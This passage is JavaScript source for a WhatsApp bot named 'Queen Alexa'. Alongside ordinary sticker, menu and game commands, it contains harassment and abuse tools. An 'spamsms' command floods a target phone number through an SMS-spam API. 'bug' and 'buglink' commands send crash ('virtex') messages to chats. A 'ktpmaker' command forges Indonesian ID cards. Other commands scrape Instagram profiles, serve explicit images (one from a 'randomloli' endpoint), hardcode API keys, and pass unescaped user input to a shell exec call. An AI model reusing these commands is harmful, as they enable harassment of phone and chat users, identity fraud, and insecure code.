                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        hyper.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    hyper.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return hyper.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return hyper.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumb}`)})
        }
        
//FUNCTION
           //FUNCTION

    function clockString(ms) {

      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await hyper.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

    let ii = []
		let giid = []
		for (mem of totalchat){
			ii.push(mem.jid)
		}
				for (id of ii){
		if (id && id.includes('g.us')){
		giid.push(id)
		}
		}
    const  timestampi = speed();
		const  latensii = speed() - timestampi
		const latensiii = `${latensii.toFixed(4)} _Second_`
		const ini_gcchat = `${giid.length}`
		const ini_totalchat = `${totalchat.length - giid.lenght}`

    const replyy = (teks) => {
			hyper.sendMessage(from, teks, sticker, { quoted: fgclink })
		}
		
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    

    if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'dari', color(sender.split('@')[0]), 'args :', color(args.length))
    if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, 'message', color(command), 'nomor', color(sender.split('@')[0]), 'Dari grup', color(groupName), 'args :', color(args.length))
    
if (!mek.key.fromMe && banChats === true)  return
switch (command) {
      case prefix+ 'status':
  	fakeitem(`*STATUS*\n> PREFIX : *${prefix}* \n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
    break
		case prefix+ 'mode':
    if (!isOwner && !mek.key.fromMe) return await reply('I am sorry, I dont know you')
        sendButMessage(from, `MODE SELF/PUBLIC\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`, `Please choose one`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: "RESPONSE",
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: "RESPONSE",
          },
          {
            buttonId: `${prefix}info`,
            buttonText: {
              displayText: `INFO BOT`,
            },
            type: "RESPONSE",
          },
        ]);
        break
      case prefix+'q':
        if (!m.quoted) return reply("reply message!");
        let qse = hyper.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break
        
//MENU KU
case prefix+ 'igstalk':
		            if (!q) return fakegroup('Username?')
		            reply (`bentar kak ${pushname}`)
		            const tod = await fetchJson(`https://fdz-app.herokuapp.com/api/stalkig?username=${q}`);
		            console.log(`${args.join(' ')}`)
		            ten = `${tod.picurl}`
		            teks = `INSTAGRAM STALKING
DATA BERHASIL DIDAPATKAN\n\n
▷ Link : https://instagram.com/${args.join('')}
▷ Username :  ${tod.username}
▷ Full Name : ${tod.fullname}
▷ Followers : ${tod.followers}
▷ Following : ${tod.following}
▷ Private : ${tod.private_user}
▷ Verified : ${tod.verified_user}
▷ total post : ${tod.post}
▷ Prof account : ${tod.professional_account}
▷ account category : ${tod.category_name}
▷ Bio : \n ${tod.bio}
▷ External link : \n${tod.external_url}`
		            sendMediaURL(from,ten,teks)
		            break



//maker
                case prefix+ 'tulis':
              if (args.length < 1) return reply(`*Usage*: ${prefix + command} nama&kelas&nomo&kata\n*Example*: ${prefix + command} udin&20&17&blablabla`)
              var bodi = args.join(" ")
              var nama = bodi.split("&")[0];
              var kelas = bodi.split("&")[1];
              var no = bodi.split("&")[2];
              var aksarane = bodi.split("&")[3];
              reply('make boss...')
                 rakz = await getBuffer(`https://fdz-app.herokuapp.com/api/tulis?nama=${nama}&no=${no}&kelas=${kelas}&text=${aksarane}`)
                 hyper.sendMessage(from, rakz, image, { quoted: mek ,thumbnail: Buffer.alloc(0) });
                 break;

                   case prefix+ 'ktpmaker':
                    if (args.length == 0) return reply(`Usage: ${command} nik|province|regency|name|place, date of birth|gender|street|rt/rw|kelurahan|kecamatan|religion|marital status|occupation|citizen|valid until|url_image\n\nExample : ${command} 456127893132123|bumipertiwi|mirage|LoL Human|mars, 99-99-9999|not yet found|jl wardoyo|999/999|ture|imtuni|alhamdulillah islam|single kack|thinking about him|indo ori no kw| Judgment Day|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    reply('waitt')
                    try{
                    bikin = (`https://ferdiz-afk.my.id/api/maker/ktp?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gdarah=-&almt=${jl}&rt-rw=${rtrw}&kel=${lurah}&kcmtn=${camat}&agma=${agama}&status=${nikah}&kerja=${kerja}&negara=${warga}&berlaku=${until}&prov=${prov}&kab=${kabu}&picurl=${img}`)
                    console.log(bikin)
                    imge = await getBuffer(bikin)
                    await hyper.sendMessage(from, imge, image, { quoted: mek });
                    } catch (e) {
					console.log('Error :', e)
					fakestatus('Anjim can"t, check the image url bro:)')
					}
                    break;



case prefix+ 'del':
  try{
              hyper.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
  } catch (e) {
					console.log('Error :', e)
					fakestatus('Anjim can"t, come on :)')
					}
              break
        case prefix+ 'menu':
        case prefix+ 'help':

       teks = `╭─「 ⏤͟͟͞͞ΔQueen AlexaΔ͟͟͟͟͞͞͞͞ x
□ *INFO DEVELOPER*
┝ *Nama* : Hyper & Supun
┝  number : wa.me/+94767043432 [ Hyper ]
┝  number : wa.me/+94753943957 [ Supun ]
┝  Github :「 https://github.com/HYPER-MOD ツ 」
┝  youtube : 「 https://youtube.com/c/HYPERMOD ツ 」
┝  Ig : @HYPER_MOD
┝  Owners Birthday: V

□  INFO USER
┝  Nama : ${pushname}
┝  Number : @${sender.split("@")[0]}

□  INFO ${botname}
┝  Name* : ${botname}
┝  Prefix* : ⸨${prefix}⸩
┝  🕰Jam : ${jam}:${menit}:${detik} ${ampm}
┝  🗓️Tanggal : ${day} - ${myMonths[bulan]} - ${year}
┝  Versi Whatsapp : ${hyper.user.phone.wa_version}
┝  Total Chat : ${totalchat.length}`
                rakz = fs.readFileSync(`./image/Alexamenu.jpg`)
                buttons = [
          { buttonId: `${prefix}menu2`, buttonText: { displayText: "MENU" }, type: 1 },
          { buttonId: `${prefix}sc`, buttonText: { displayText: "SCRIPT" }, type: 1 }
        ];         
        imageMsg = (
          await hyper.prepareMessageMedia(rakz, "imageMessage", {thumbnail: rakz,
           })).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "Queen Alexa kkk",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await hyper.prepareMessageFromContent(
          from,
          { buttonsMessage }, {quoted: mek, contextInfo: {mentionedJid: [sender]}});

        hyper.relayWAMessage(prep);

break
				case prefix+'d':
				case prefix+'del':
				case prefix+'delete':
				if (!isOwner && !mek.key.fromMe)
					hyper.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
case prefix+'spamsms':
if (!isOwner && !mek.key.fromMe)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=lolhuman&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=lolhuman&nomor=${nomor}`)
                    reply("Success")
                    break
                    case prefix+'loli':
reply(mess.wait)
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/randomloli?apikey=Ikyy69`)
img = await getBuffer(anu.link)
hyper.sendMessage(from, img, image, { quoted: mek})
                    break
                    case  prefix+'neko':
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek})
break
case prefix+ 'megumin':
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek})
break
case prefix+ 'hentai': 
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek})
break
case  prefix+'blowjob':
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek})
break
case  prefix+'trapnime':
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./image/Alexamenu.jpg')})
break
case prefix+ 'awoo':
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek})
break
case prefix+'bj':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'wallpaper':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'pussy':
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=hardianto`)
hyper.sendMessage(from, hai, image, { quoted: mek})
break
case prefix+'lesbian':
reply(mess.wait)
kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=hardianto`)
kon = await getBuffer(kau)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'kitsune':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'slap':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'poke':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'neko2':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'neko2':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'keta':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'baka':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'yuri':
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`)
anu = await getBuffer(kon)
hyper.sendMessage(from, anu, image, { quoted: mek})
break
case prefix+'anal':
reply(mess.wait)
aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=hardianto`)
kon = await getBuffer(aku)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case prefix+'eroneko':
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`)
kon = await getBuffer(hai)
hyper.sendMessage(from, kon, image, { quoted: mek})
break
case  prefix+'neko':
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
hyper.sendMessage(from, buffer, image, { quoted: mek})
break
                    case prefix+'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            hyper.sendMessage(from,media,image,{quoted:mek,caption:'Made By Hyper Mod'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            case prefix+'handsome':
       case prefix+'gantengcek':
              if (!isGroup) return reply(mess.only.group)
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              hyper.sendMessage(from, '*Question :* '+ganteng+'\n*Answer :* '+ teng+'%', text, { quoted: mek })
              break
              case prefix+'can':
  if (!isGroup) return reply(mess.only.group)
              bisakah = body.slice(1)
              const bisa =['Can','Cant','Try Repeat','WHERE DO I KNOW']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              hyper.sendMessage(from, '*Question :* '+bisakah+'\n*Answer :* '+ keh, text, { quoted: mek })
              break
       case prefix+'when':
         if (!isGroup) return reply(mess.only.group)
              kapankah = body.slice(1)
              const kapan =['Tomorrow', 'The day after tomorrow', 'Earlier', '4 more days', '5 more days', '6 more days', '1 more week', '2 more weeks', '3 more weeks','1 Another Month','2 Months','3 Months','4 Months','5 Months','6 Months','1 Year Again','2 Years Again','3 Years Again ','4 Years','5 Years','6 Years','1 Century Again','3 Days Again']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              hyper.sendMessage(from, '*Question :* '+kapankah+'\n*Answer :* '+ koh, text, { quoted: mek })
              break
              case prefix+'truth':
              if (!isOwner && !isGroup) return reply(mess.only.group)
              const trut =['ඔබ කවදා හෝ කිසිවෙකුට කැමති වී තිබේද? කොපමණ වේලාවක් ද? ',' ඔබට හැකි නම් හෝ ඔබට අවශ්‍ය නම් ජීසී/බාහිරින් ඔබ සමඟ මිත්‍ර වන්නේ කවුරුන් සමඟ ද? (සමහර විට වෙනස්/එකම ස්ත්‍රී පුරුෂ භාවය) ',' ඔබේ ලොකුම බිය කුමක්ද? ',' ඔබට තිබේද? කවදා හෝ කෙනෙකුට කැමති වී ඒ පුද්ගලයා ඔබටත් කැමතිද? ',' ඔබ රහසින් කැමති වූ ඔබේ මිතුරාගේ හිටපු පෙම්වතියගේ නම කුමක්ද? ',' ඔබ කවදා හෝ ඔබේ මවගෙන් හෝ පියාගෙන් මුදල් සොරාගෙන තිබේද? හේතුව? ',' ඔබ දුකෙන් සිටින විට ඔබව සතුටු කරන්නේ කුමක් ද ',' ඔබට කවදා හෝ ඒකපාර්ශ්වික ආදරයක් තිබුණාද? එසේ නම් කවුද? එය ඔබට දැනෙන්නේ කෙසේද? ',' ඔබව ඉතාමත් සතුටු කළ හැකි පුද්ගලයා කවුද? ',' ඔබව සතුටට පත් කළේ කවුරුන්ද ',' (මුස්ලිම්වරුන් සඳහා) ඔබට දවස පුරාම යාච්yingා කිරීම මඟ හැරී තිබේද? ',' මෙහි ඔබේ පරමාදර්ශී ආකාරයේ සහකරුට සමීපතම කවුද ',' ඔබ කා සමඟ සෙල්ලම් කිරීමට කැමතිද? ' , 'මිනිසුන් කවදා හෝ ප්‍රතික්ෂේප කරනවාද? හේතුව කුමක් ද?']
              const ttrth = trut[Math.floor(Math.random() * trut.length)]
              truteh = await getBuffer(`https://i.ibb.co/1Q3yf3d/20211005-192310.png`)
              hyper.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
              break
              case prefix+'dare':
              if (!isOwner && !isGroup) return reply(mess.only.group)
              const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
              const der = dare[Math.floor(Math.random() * dare.length)]
              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              hyper.sendMessage(from, buffer, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
              break
            case prefix+'slot':
            case prefix+'slots':
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            hyper.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nDescription: If you get 3 of the same means you win\n\nExample : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
            case prefix+'semoji':
			if (args === 0) return reply('the emoji?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('fail'))
           })
    	   break
    	   case prefix+'bug':
					if (!isOwner) return fakegroup('「 Only for bot owners! 」')
					if (args.length < 1) return reply('ඉන්න හයිපර් එවයි?')
				 for (let i = 0; i < args[0]; i++) {
await hyper.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, 'Sukses Send HYPER BUG👻 '+args.join(' '), fake)
					break
    	   case prefix+'buglink':
                if (!isOwner) return fakegroup('「 Only for bot owners! 」')
                 hyper.toggleDisappearingMessages(from, 0)
               hyper.sendMessage(from, virtex3(prefix), text, { quoted:ftroli, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/1Q3yf3d/20211005-192310.png",
                "thumbnail": fs.readFileSync(`./image/lakshitha.jpg`),
                "sourceUrl": "https://youtube.com/c/HYPERMOD"}}})
                break 
                case prefix+'setprofile':
				case prefix+'setdp':
				hyper.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply image!')
					if (!isOwner) return fakegroup('「 Only for bot owners! 」')
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await hyper.downloadAndSaveMediaMessage(enmediau)
					await hyper.updateProfilePicture(botNumber, mediau)
					reply('SUCCESS')
					break
					case prefix+'base64enc': 			
				if (args.length < 1) return reply(`Contoh: manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b64enc?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result)
					break
					case prefix+'base64dec': 		
				if (args.length < 1) return reply(`Contoh: manik`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b64dec?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result)
					break	
					case prefix+'base32enc': 
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b32enc?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result)
					break
					case prefix+'base32dec': 
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b32dec?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result)
					break				
					case prefix+'sha1enc': 	
					gatauda = body.slice(9)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha1?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result.encrypt)
					break
					case prefix+'sha256enc': 	
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha256?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result.encrypt)
					break
					case prefix+'sha512enc': 	
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha512?text=${gatauda}&APIKEY=7415bc4287ad5ca8`)
					reply(anu.result.encrypt)
					break
					case prefix+'asupan1':
					reply(mess.wait)
                anu = await getBuffer(`https://api.xteam.xyz/shitpost?APIKEY=7415bc4287ad5ca8`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_hyper.mp4`, quoted: mek, caption: 'Asupuan By Queen Alexa'})
                await limitAdd(sender) 
                break                
                case prefix+'asupan2':
					reply(mess.wait)
                anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupan?apikey=hypermod`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_hyper.mp4`, quoted: mek, caption: 'Asupuan By Queen Alexa'})
                await limitAdd(sender) 
                break
                case prefix+'asupan3':
					reply(mess.wait)
                anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=hypermod`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_hyper.mp4`, quoted: mek, caption: 'Asupuan By Queen Alexa'})
                await limitAdd(sender) 
                break
                case prefix+'asupan4':
					reply(mess.wait)
                anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=hypermod`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_hyper.mp4`, quoted: mek, caption: 'Asupuan By Queen Alexa'})
                await limitAdd(sender) 
                break
                case prefix+'asupan5':
					reply(mess.wait)
                anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=hypermod`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_hyper.mp4`, quoted: mek, caption: 'Asupuan By Queen Alexa'})
                await limitAdd(sender) 
                break
                case prefix+'asupan6':
					reply(mess.wait)
                anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=hypermod`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_hyper.mp4`, quoted: mek, caption: 'Asupuan By Queen Alexa'})
                await limitAdd(sender) 
                break
                case prefix+'anime1':
					reply(mess.wait)
                anu = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=hypermod`)
                hyper.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `anime_hyper.mp4`, quoted: mek, caption: 'By Queen Alexa'})
                await limitAdd(sender) 
                break
                case prefix+'sticker': 
    case prefix+'stiker':
    case prefix+'sg':
    case prefix+'s':
    case prefix+'stickergif':
    case prefix+'stikergif':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await hyper.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                hyper.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await hyper.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Failed to convert ${type} to sticker`)
            })
            .on('end', function () {
            console.log('Finish')
            hyper.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
